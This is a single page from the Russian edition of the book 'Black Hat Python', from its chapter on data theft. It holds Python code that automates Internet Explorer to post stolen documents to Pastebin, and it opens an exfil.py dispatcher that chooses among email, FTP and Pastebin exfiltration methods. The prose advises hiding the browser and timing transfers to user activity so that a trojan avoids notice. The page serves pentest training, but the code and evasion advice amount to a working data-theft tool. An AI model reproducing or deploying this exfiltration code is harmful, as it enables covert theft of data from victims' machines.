# Black Hat Python. Программирование для хакеров и пентестеров — страница 184

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

184   Глава 9. Похищение данных
    ie.Navigate('https://pastebin.com/login')
    wait_for_browser(ie)
    login(ie)
    ie.Navigate('https://pastebin.com/')
    wait_for_browser(ie)
    submit(ie, title, contents.decode())
    ie.Quit() 
if __name__ == '__main__':
    ie_paste('title', 'contents')
Функция ie_paste вызывается для каждого документа, который мы хотим
сохранить в Pastebin. Вначале она создает новый COM-объект Internet
Explo rer . Мы сами можем решать, будет процесс видимым или нет , что
неплохо. На время отладки оставьте значение 1, но когда вам нужна будет мак-
симальная скрытность, обязательно поменяйте его на 0. Это по-настоящему
полезно в ситуациях, когда ваш троян, к примеру , следит за происходящим
в системе, — вы можете начать передачу документов в момент повышенной
активности, чтобы ваши действия еще лучше сливались с действиями поль-
зователя. Вызвав все вспомогательные функции, мы просто удаляем свой
экземпляр Internet Explorer  и завершаем работу .
Собираем все вместе
В завершение поместим все только что написанные методы вывода похи-
щенных данных за пределы системы в скрипт exfil.py, который позволит
вызвать любой из них:
from cryptor import encrypt, decrypt 
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste
import os
EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
    }
